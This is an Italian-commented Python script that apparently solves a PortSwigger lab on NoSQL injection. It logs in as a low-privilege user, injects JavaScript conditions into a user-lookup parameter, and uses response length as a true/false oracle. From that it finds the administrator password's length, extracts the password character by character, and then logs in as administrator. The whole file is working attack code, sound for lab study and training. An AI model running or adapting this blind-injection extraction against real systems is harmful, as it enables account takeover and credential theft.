"""
    RISOLUZIONE DEL LAB: https://portswigger.net/web-security/nosql-injection/lab-nosql-injection-extract-data
    Refactoring con Typer e Rich
"""
import requests
import re
import typer
from rich.console import Console
from rich.panel import Panel
from rich.progress import Progress, SpinnerColumn, TextColumn, BarColumn
from rich.theme import Theme

# Configurazione Rich Console
custom_theme = Theme({
    "info": "cyan",
    "warning": "yellow",
    "error": "bold red",
    "success": "bold green",
    "highlight": "magenta"
})
console = Console(theme=custom_theme)
app = typer.Typer(add_completion=False)

class NoSQLInjectionExploit:
    def __init__(self, lab_id: str):
        # Gestione input ID o URL
        if "web-security-academy.net" in lab_id:
            self.base_url = lab_id if lab_id.startswith("http") else f"https://{lab_id}"
        else:
            self.base_url = f"https://{lab_id}.web-security-academy.net"
            
        self.session = requests.Session()

    def check_lab_status(self):
        """Verifica la raggiungibilità del target"""
        try:
            with console.status(f"[bold]Connessione a {self.base_url}...[/bold]", spinner="dots"):
                response = self.session.get(self.base_url, timeout=10)
            
            if response.status_code == 200:
                console.print(f"[success]✔ Lab raggiungibile[/success]")
                return True
            else:
                console.print(f"[error]✘ Lab non raggiungibile (Status: {response.status_code})[/error]")
                return False
        except Exception as e:
            console.print(f"[error]✘ Errore connessione: {e}[/error]")
            return False

    def login(self, username="wiener", password="peter"):
        """Effettua il login per ottenere una sessione valida"""
        console.print(f"[info]➤ Tentativo di login con credenziali base:[/info] [highlight]{username}:{password}[/highlight]")
        
        try:
            # 1. Otteniamo il token CSRF dalla pagina di login
            login_page = self.session.get(f"{self.base_url}/login", timeout=10)
            csrf_match = re.search(r'name="csrf" value="([^"]+)"', login_page.text)
            csrf_token = csrf_match.group(1) if csrf_match else ""
            
            login_data = {
                "csrf": csrf_token,
                "username": username,
                "password": password
            }
            
            response = self.session.post(
                f"{self.base_url}/login",
                data=login_data,
                allow_redirects=True,
                timeout=10
            )
            
            if response.status_code == 200 and "Your username is:" in response.text:
                console.print(f"[success]✔ Login effettuato con successo! Sessione valida acquisita.[/success]")
                return True
            else:
                console.print(f"[error]✘ Login fallito[/error]")
                return False
        except Exception as e:
            console.print(f"[error]✘ Errore durante il login: {e}[/error]")
            return False

    def check_password_length(self, username="administrator"):
        """Determina la lunghezza della password usando JavaScript Injection"""
        console.print(Panel(f"Fase 1: Enumerazione Lunghezza Password ({username})", border_style="cyan"))

        # Payload logic: ' & this.password.length < X || 'a'=='b
        # Spiegazione: Iniettiamo JS. Se la lunghezza è < X, ritorna vero.
        # L'oracolo è la lunghezza della risposta (> 38 byte indica True).

        ranges = [(1, 10), (10, 20), (20, 30), (30, 40)]
        
        with console.status("[bold cyan]Scansione lunghezza in corso...[/bold cyan]") as status:
            for range_start, range_end in ranges:
                # Controlla se la lunghezza è nel range (minore del limite superiore)
                payload = f"{username}' & this.password.length < {range_end} || 'a'=='b"
                params = {"user": payload}
                
                response = self.session.get(
                    f"{self.base_url}/user/lookup",
                    params=params,
                    timeout=10
                )
                
                # Oracle: Response Length Check
                if response.status_code == 200 and len(response.text) > 38:
                    status.update(f"[bold green]Range identificato: {range_start}-{range_end}[/bold green]")
                    console.print(f"[info]Lunghezza password < {range_end}. Raffinamento ricerca...[/info]")
                    
                    # Ricerca lineare inversa nel range trovato
                    for length in range(range_end - 1, range_start - 1, -1):
                        payload = f"{username}' & this.password.length == {length} || 'a'=='b"
                        params = {"user": payload}
                        
                        response = self.session.get(
                            f"{self.base_url}/user/lookup",
                            params=params,
                            timeout=10
                        )
                        
                        if response.status_code == 200 and len(response.text) > 38:
                            console.print(f"[success]✔ Lunghezza esatta trovata: {length}[/success]")
                            return length
        
        console.print("[error]✘ Impossibile determinare la lunghezza della password[/error]")
        return None

    def extract_password(self, username="administrator", length=None):
        """Estrae la password carattere per carattere"""
        if length is None:
            return None

        console.print(Panel(f"Fase 2: Estrazione Password ({length} caratteri)", border_style="magenta"))
        
        password = ""
        charset = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789" # Charset esteso per sicurezza
        
        # Setup Progress Bar
        with Progress(
            SpinnerColumn(),
            TextColumn("[progress.description]{task.description}"),
            BarColumn(),
            TextColumn("{task.completed}/{task.total}"),
            console=console
        ) as progress:
            
            task = progress.add_task(f"[cyan]Estrazione...", total=length)
            
            for position in range(length):
                found_char = False
                
                for char in charset:
                    # Payload: Verifica carattere specifico tramite indice array JS
                    payload = f"{username}' & this.password[{position}] == '{char}' || 'a'=='b"
                    
                    params = {"user": payload}
                    response = self.session.get(
                        f"{self.base_url}/user/lookup",
                        params=params,
                        timeout=10
                    )
                    
                    # Oracle: Content Length > 38 significa TRUE
                    if response.status_code == 200 and len(response.text) > 38:
                        password += char
                        progress.console.print(f"[green]✔ Pos {position}: Trovato '{char}'[/green]")
                        progress.update(task, advance=1)
                        found_char = True
                        break
                
                if not found_char:
                    progress.console.print(f"[error]✘ Carattere in posizione {position} non trovato nel charset![/error]")
                    return None

        console.print(Panel(f"[bold green]PASSWORD ESTRATTA: {password}[/bold green]", expand=False))
        return password

    def solve_lab(self, extracted_password):
        """Effettua il login come administrator per completare il lab"""
        console.print(Panel("Fase 3: Accesso Amministrativo Finale", border_style="green"))
        
        # Ottieni nuovo CSRF token per login admin
        login_page = self.session.get(f"{self.base_url}/login", timeout=10)
        csrf_match = re.search(r'name="csrf" value="([^"]+)"', login_page.text)
        csrf_token = csrf_match.group(1) if csrf_match else ""
        
        login_data = {
            "csrf": csrf_token,
            "username": "administrator",
            "password": extracted_password
        }
        
        response = self.session.post(
            f"{self.base_url}/login",
            data=login_data,
            allow_redirects=True,
            timeout=10
        )
        
        if response.status_code == 200 and "administrator" in response.text.lower():
            console.print("[bold green]★ LOGIN AMMINISTRATORE RIUSCITO![/bold green]")
            console.print("[bold green]★ LAB COMPLETATO![/bold green]")
            return True
        else:
            console.print("[error]✘ Login come administrator fallito[/error]")
            return False

@app.command()
def main(lab_id: str = typer.Argument(..., help="ID del Lab o URL completo")):
    """
    Script per NoSQL Injection (JavaScript Data Extraction).
    """
    exploit = NoSQLInjectionExploit(lab_id)
    
    # Check Iniziale
    if not exploit.check_lab_status():
        raise typer.Exit(code=1)
    
    # 1: Login come wiener per ottenere sessione valida
    # Necessario perché l'endpoint /user/lookup richiede autenticazione
    if not exploit.login("wiener", "peter"):
        raise typer.Exit(code=1)

    # 2: Trova lunghezza password
    length = exploit.check_password_length("administrator")
    
    if length:
        # 3: Estrai password
        password = exploit.extract_password("administrator", length)
        
        if password:
            # 4: Login finale e Soluzione
            exploit.solve_lab(password)
        else:
            raise typer.Exit(code=1)
    else:
        raise typer.Exit(code=1)

if __name__ == "__main__":
    app()